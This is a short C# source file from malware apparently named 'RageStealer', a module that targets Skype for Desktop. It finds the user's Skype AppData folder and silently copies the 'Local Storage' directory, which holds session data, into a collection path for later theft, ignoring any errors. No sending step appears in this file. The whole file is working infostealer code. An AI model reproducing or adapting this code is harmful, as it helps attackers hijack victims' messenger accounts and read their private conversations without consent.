using System.IO;
using RageStealer.Helper;
using RageStealer.Helpers;

namespace RageStealer.Target.Messengers;

internal sealed class Skype
{
	private static readonly string SkypePath = Path.Combine(Paths.Appdata, "Microsoft\\Skype for Desktop");

	public static void GetSession(string sSavePath)
	{
		if (!Directory.Exists(SkypePath))
		{
			return;
		}
		string text = Path.Combine(SkypePath, "Local Storage");
		if (!Directory.Exists(text))
		{
			return;
		}
		try
		{
			Filemanager.CopyDirectory(text, sSavePath + "\\Local Storage");
			Counter.Skype = true;
		}
		catch
		{
		}
	}
}
